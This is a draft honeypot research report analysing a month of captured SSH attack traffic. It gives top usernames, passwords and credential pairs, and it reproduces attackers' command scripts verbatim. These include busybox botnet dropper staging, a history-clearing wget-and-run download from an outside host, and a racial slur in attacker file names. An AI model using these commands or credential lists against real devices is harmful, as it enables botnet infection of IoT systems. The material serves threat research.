DRAFT DRAFT DRAFT


# Digging in a month of SSH data #

Date: January 2019

Author: Markus Schmall

When you operate a large honeypot network, besides infected customer information, the generation of IP reputation  lists, it is also a good idea to dig a little bit deeper in the data.
The following data was taken from DTAGs Honeypot network (https://dtag-dev-sec.github.io) and (https://www.sicherheitstacho.eu).
Obviously since the rise of the notorious Mirai botnet family, we see a lot of SSH/telnet scanning in the
internet.

## Context ##

- 30 days of SSH data (collected by Cowrie, T-Pot)
- 76382827 sessions & alarms
- 400 SSH honeypots (cowrie, all T-Pot[https://dtag-dev-sev.github.io] based)
- data collected from 23th of October to 22th of November 2018


## Tools used ##

- Elasticsearch (https://www.elastic.co/)
- Elasticdump (https://www.npmjs.com/package/elasticdump)
- Grafana (https://grafana.com/)
- Atom (https://atom.io/)

## First steps ##

Initially , when looking at looking at the distribution of all requests, we see roughly 2mio++ login attempts per day and about 10% successful login attempts over the time.



![Login distribution](https://github.com/schmalle/digintossh/raw/master/logins.png "Grafana graphics")


### Top usernames including counter (36700 individual usernames in total) ###

Relevant Elasticsearch command is:


```GET http://localhost:9200/ssh/_search
  {
    "aggs": {
      "genres": {
        "terms": {
          "field": "username",
          "size": 100
        }
      }
    }
  }
  ```



- root: 27627033
- admin: 9552633
- shell%00: 5920328
- enable%00: 5472930
- sh: 3728254
- /bin/busybox%20rm%20-rf%2019ju3d%20902i13: 1788873
- /bin/busybox%20rm%20-rf%20NiGGeR69xd%20dropper: 1600622
- guest: 1355178
- default: 1111168
- user: 930137
- support: 902638
- 3E/usr/.misa%20%26%26%20cd%20/usr/: 886671

### Top passwords including counter ###


- sh%00: 5749221
- system%00: 5106154
- admin: 2217009
- /bin/busybox%20cp%20/bin/busybox%2019ju3d%3B%20%3E19ju3d%3B%20/bin/busybox%20chmod%20777%2019ju3d%3B%20/bin/busybox%20AK1K2: 1788873
- /bin/busybox%20ECCHI: 1754324
- 1234: 1669745
- /bin/busybox%20cp%20/bin/busybox%20NiGGeR69xd%3B%20%3ENiGGeR69xd%3B%20/bin/busybox%20chmod%20777%20NiGGeR69xd%3B%20/bin/busybox%20SORA: 1578145
- password: 1282365
- 12345: 1279241
- 123456: 1078316


The absolut number of unique username / password combinations is 167421.
(see https://github.com/schmalle/digintossh/blob/master/tools/unpw.py)

### The most often seen username / password combination have been: ###


- 158721: {'username': 'system', 'password': 'shell'}
- 141277: {'username': 'default', 'password': 'default'}
- 138411: {'username': 'sh', 'password': '%3E/tmp/.ptmx%20%26%26%20cd%20/tmp/'}
- 135306: {'username': '1234', 'password': '1234'}
- 124605: {'username': '%3E/var/.ptmx%20%26%26%20cd%20/var/', 'password': '%3E/dev/.ptmx%20%26%26%20cd%20/dev/'}
- 122904: {'username': 'admin', 'password': '%21'}
- 117839: {'username': 'enable%00', 'password': 'linuxshell%00'}
- 113421: {'username': 'telnet', 'password': 'telnet'}
- 110402: {'username': '%3E/mnt/.ptmx%20%26%26%20cd%20/mnt/', 'password': '%3E/var/run/.ptmx%20%26%26%20cd%20/var/run/'}
- 109628: {'username': '%3E/var/tmp/.ptmx%20%26%26%20cd%20/var/tmp/', 'password': '%3E/.ptmx%20%26%26%20cd%20/'}
- 108376: {'username': '%3E/bin/.ptmx%20%26%26%20cd%20/bin/', 'password': '%3E/etc/.ptmx%20%26%26%20cd%20/etc/'}
- 108320: {'username': '%3E/dev/netslink/.ptmx%20%26%26%20cd%20/dev/netslink/', 'password': '%3E/dev/shm/.ptmx%20%26%26%20cd%20/dev/shm/'}
- 107552: {'username': '%3E/boot/.ptmx%20%26%26%20cd%20/boot/', 'password': '%3E/usr/.ptmx%20%26%26%20cd%20/usr/'}
- 102926: {'username': '/bin/busybox%20rm%20-rf%20fjxki%20ofndrsex', 'password': '/bin/busybox%20cp%20/bin/busybox%20fjxki%3B%20%3Efjxki%3B%20/bin/busybox%20chmod%20777%20fjxki%3B%20/bin/busybox%20OSIRIS'}
- 100236: {'username': 'telnetadmin', 'password': 'telnetadmin'}
- 96050: {'username': '/bin/busybox%20rm%20-rf%20v5lol%20apophis', 'password': '/bin/busybox%20cp%20/bin/busybox%20v5lol%3B%20%3Ev5lol%3B%20/bin/busybox%20chmod%20777%20v5lol%3B%20/bin/busybox%20APEP'}
- 93326: {'username': 'default', 'password': 'lJwpbo6'} (attributed to Bushido botnet, https://sidechannel.tempestsi.com/botnet-bushido-has-increased-activity-detected-114328227dd2)
- 93116: {'username': '/bin/busybox%20rm%20-rf%20SO190Ij1X%20dropper', 'password': '/bin/busybox%20cp%20/bin/busybox%20SO190Ij1X%3B%20%3ESO190Ij1X%3B%20/bin/busybox%20chmod%20777%20SO190Ij1X%3B%20/bin/busybox%20SORA1337'}
87541: {'username': '/bin/busybox%20rm%20-rf%20KOWAI-BAdAsV%20KOWAI-d', 'password': '/bin/busybox%20cp%20/bin/busybox%20KOWAI-BAdAsV%3B%20%3EKOWAI-BAdAsV%3B%20/bin/busybox%20chmod%20777%20KOWAI-BAdAsV%3B%20/bin/busybox%20KowaiSlump'}
- 87247: {'username': 'vstarcam2015', 'password': '20150602'} (E.g. the username "vstarcam2015" belongs to a C7824WIP HD indoor IP Camera device, which password was e.g. discussed here: https://www.fontenay-ronan.fr/c7824wip-security-review/.)
- 85005: {'username': 'admin', 'password': 'admin123'}


(see https://github.com/schmalle/digintossh/blob/master/tools/unpw2.py)

### The most often scripts are ###

24256: 

```
uname -a
```

13834: 

```sh
/bin/busybox ECCHI
/bin/busybox ps; /bin/busybox ECCHI
/bin/busybox cat /proc/mounts; /bin/busybox ECCHI
/bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon; /bin/busybox cat /.nippon; /bin/busybox rm /.nippon
/bin/busybox echo -e '\x6b\x61\x6d\x69/sys' > /sys/.nippon; /bin/busybox cat /sys/.nippon; /bin/busybox rm /sys/.nippon
/bin/busybox echo -e '\x6b\x61\x6d\x69/proc' > /proc/.nippon; /bin/busybox cat /proc/.nippon; /bin/busybox rm /proc/.nippon
/bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon
/bin/busybox echo -e '\x6b\x61\x6d\x69/dev/pts' > /dev/pts/.nippon; /bin/busybox cat /dev/pts/.nippon; /bin/busybox rm /dev/pts/.nippon
/bin/busybox echo -e '\x6b\x61\x6d\x69/run' > /run/.nippon; /bin/busybox cat /run/.nippon; /bin/busybox rm /run/.nippon
/bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon; /bin/busybox cat /.nippon; /bin/busybox rm /.nippon
/bin/busybox echo -e '\x6b\x61\x6d\x69/dev/shm' > /dev/shm/.nippon; /bin/busybox cat /dev/shm/.nippon; /bin/busybox rm /dev/shm/.nippon
/bin/busybox echo -e '\x6b\x61\x6d\x69/run/lock' > /run/lock/.nippon; /bin/busybox cat /run/lock/.nippon; /bin/busybox rm /run/lock/.nippon
/bin/busybox echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc' > /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox cat /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox rm /proc/sys/fs/binfmt_misc/.nippon
/bin/busybox echo -e '\x6b\x61\x6d\x69/sys/fs/fuse/connections' > /sys/fs/fuse/connections/.nippon; /bin/busybox cat /sys/fs/fuse/connections/.nippon; /bin/busybox rm /sys/fs/fuse/connections/.nippon
/bin/busybox echo -e '\x6b\x61\x6d\x69/boot' > /boot/.nippon; /bin/busybox cat /boot/.nippon; /bin/busybox rm /boot/.nippon
/bin/busybox echo -e '\x6b\x61\x6d\x69/home' > /home/.nippon; /bin/busybox cat /home/.nippon; /bin/busybox rm /home/.nippon
/bin/busybox echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc' > /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox cat /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox rm /proc/sys/fs/binfmt_misc/.nippon
/bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon
/bin/busybox ECCHI
rm /.t; rm /.sh; rm /.human
rm /sys/.t; rm /sys/.sh; rm /sys/.human
rm /proc/.t; rm /proc/.sh; rm /proc/.human
rm /dev/.t; rm /dev/.sh; rm /dev/.human
rm /dev/pts/.t; rm /dev/pts/.sh; rm /dev/pts/.human
rm /run/.t; rm /run/.sh; rm /run/.human
rm /.t; rm /.sh; rm /.human
rm /.t; rm /.sh; rm /.human
rm /dev/shm/.t; rm /dev/shm/.sh; rm /dev/shm/.human
rm /run/lock/.t; rm /run/lock/.sh; rm /run/lock/.human
rm /proc/sys/fs/binfmt_misc/.t; rm /proc/sys/fs/binfmt_misc/.sh; rm /proc/sys/fs/binfmt_misc/.human
rm /boot/.t; rm /boot/.sh; rm /boot/.human
rm /home/.t; rm /home/.sh; rm /home/.human
rm /proc/sys/fs/binfmt_misc/.t; rm /proc/sys/fs/binfmt_misc/.sh; rm /proc/sys/fs/binfmt_misc/.human
rm /proc/sys/fs/binfmt_misc/.t; rm /proc/sys/fs/binfmt_misc/.sh; rm /proc/sys/fs/binfmt_misc/.human
rm /dev/.t; rm /dev/.sh; rm /dev/.human
rm /dev/.t; rm /dev/.sh; rm /dev/.human
cd /
/bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 dvrHelper; /bin/busybox ECCHI
/bin/busybox cat /bin/echo
```
10285: 
```/ip cloud print
ifconfig
uname -a
cat /proc/cpuinfo
ps | grep '[Mm]iner'
ps -ef | grep '[Mm]iner'
echo Hi | cat -n
```
8184: 

```>/var/.ptmx && cd /var/
>/dev/.ptmx && cd /dev/
>/mnt/.ptmx && cd /mnt/
>/var/run/.ptmx && cd /var/run/
>/var/tmp/.ptmx && cd /var/tmp/
>/.ptmx && cd /
>/dev/netslink/.ptmx && cd /dev/netslink/
>/dev/shm/.ptmx && cd /dev/shm/
>/bin/.ptmx && cd /bin/
>/etc/.ptmx && cd /etc/
>/boot/.ptmx && cd /boot/
>/usr/.ptmx && cd /usr/
/bin/busybox rm -rf 19ju3d 902i13
/bin/busybox cp /bin/busybox 19ju3d; >19ju3d; /bin/busybox chmod 777 19ju3d; /bin/busybox AK1K2
/bin/busybox cat /bin/busybox || while read i; do echo $i; done < /bin/busybox
```

7350: 

```system
shell
sh
>/tmp/.ptmx && cd /tmp/
>/var/.ptmx && cd /var/
>/dev/.ptmx && cd /dev/
>/mnt/.ptmx && cd /mnt/
>/var/run/.ptmx && cd /var/run/
>/var/tmp/.ptmx && cd /var/tmp/
>/.ptmx && cd /
>/dev/netslink/.ptmx && cd /dev/netslink/
>/dev/shm/.ptmx && cd /dev/shm/
>/bin/.ptmx && cd /bin/
>/etc/.ptmx && cd /etc/
>/boot/.ptmx && cd /boot/
>/usr/.ptmx && cd /usr/
/bin/busybox rm -rf 19ju3d 902i13
/bin/busybox cp /bin/busybox 19ju3d; >19ju3d; /bin/busybox chmod 777 19ju3d; /bin/busybox AK1K2
/bin/busybox cat /bin/busybox || while read i; do echo $i; done < /bin/busybox
```
7109: 
```
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
lspci | grep VGA | head -n 2 | tail -1 | awk '{print $5}'
```
7053: 
```
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
lspci | grep VGA | head -n 2 | tail -1 | awk '{print $5}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
uname -s -m
cat /proc/cpuinfo | grep name | wc -l
unset HISTFILE && rm -rf /tmp/t* && cd /tmp && wget -q zergbase.mooo.com/t && chmod +x && perl t
whoami
```
6032: 
```
>/dev/.misa && cd /dev/
>/mnt/.misa && cd /mnt/
>/var/run/.misa && cd /var/run/
>/var/tmp/.misa && cd /var/tmp/
>/.misa && cd /
>/dev/netslink/.misa && cd /dev/netslink/
>/dev/shm/.misa && cd /dev/shm/
>/bin/.misa && cd /bin/
>/etc/.misa && cd /etc/
>/boot/.misa && cd /boot/
>/usr/.misa && cd /usr/
/bin/busybox rm -rf HOHO-U79OL HOHO-9Y8G6
/bin/busybox cp /bin/busybox HOHO-U79OL; >HOHO-U79OL; /bin/busybox chmod 777 HOHO-U79OL; /bin/busybox HOHO
/bin/busybox cat /bin/busybox || while read i; do echo $i; done < /bin/busybox
```
5430: 
```
shell
sh
>/tmp/.misa && cd /tmp/
>/var/.misa && cd /var/
>/dev/.misa && cd /dev/
>/mnt/.misa && cd /mnt/
>/var/run/.misa && cd /var/run/
>/var/tmp/.misa && cd /var/tmp/
>/.misa && cd /
>/dev/netslink/.misa && cd /dev/netslink/
>/dev/shm/.misa && cd /dev/shm/
>/bin/.misa && cd /bin/
>/etc/.misa && cd /etc/
>/boot/.misa && cd /boot/
>/usr/.misa && cd /usr/
/bin/busybox rm -rf HOHO-U79OL HOHO-9Y8G6
/bin/busybox cp /bin/busybox HOHO-U79OL; >HOHO-U79OL; /bin/busybox chmod 777 HOHO-U79OL; /bin/busybox HOHO
/bin/busybox cat /bin/busybox || while read i; do echo $i; done < /bin/busybox
```
5417: 
```
system
linuxshell
shell
sh
>/tmp/.KRONOS && cd /tmp/
>/var/.KRONOS && cd /var/
>/dev/.KRONOS && cd /dev/
>/mnt/.KRONOS && cd /mnt/
>/var/run/.KRONOS && cd /var/run/
>/var/tmp/.KRONOS && cd /var/tmp/
>/.KRONOS && cd /
>/dev/netslink/.KRONOS && cd /dev/netslink/
>/dev/shm/.KRONOS && cd /dev/shm/
>/bin/.KRONOS && cd /bin/
>/etc/.KRONOS && cd /etc/
>/boot/.KRONOS && cd /boot/
>/usr/.KRONOS && cd /usr/
/bin/busybox rm -rf hu87vHVQpZ ha7556cAzS
/bin/busybox cp /bin/busybox hu87vHVQpZ; >hu87vHVQpZ; /bin/busybox chmod 777 hu87vHVQpZ; /bin/busybox Kronos1
/bin/busybox cat /bin/busybox || while read i; do echo $i; done < /bin/busybox
```
